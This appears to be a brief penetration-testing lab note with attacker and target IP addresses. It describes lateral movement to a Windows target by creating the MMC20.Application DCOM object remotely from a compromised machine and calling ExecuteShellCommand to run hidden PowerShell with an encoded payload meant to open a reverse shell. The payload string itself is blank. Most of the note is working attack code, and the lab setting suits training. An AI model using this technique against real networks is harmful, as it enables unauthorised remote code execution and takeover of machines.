---
IP_KALI: 192.168.45.155
IP_TARGET: 192.168.182.72
---
Requirements:
- The authenticated user must be "authorized"


From elevated PS prompt on compromised machine on same network as target:
- $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<span id="IP_TARGET"/>192.168.182.72<span type="end"/>"))
-  Use the payload from encoder.py to trigger reverse shell:
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e 
","7")
```
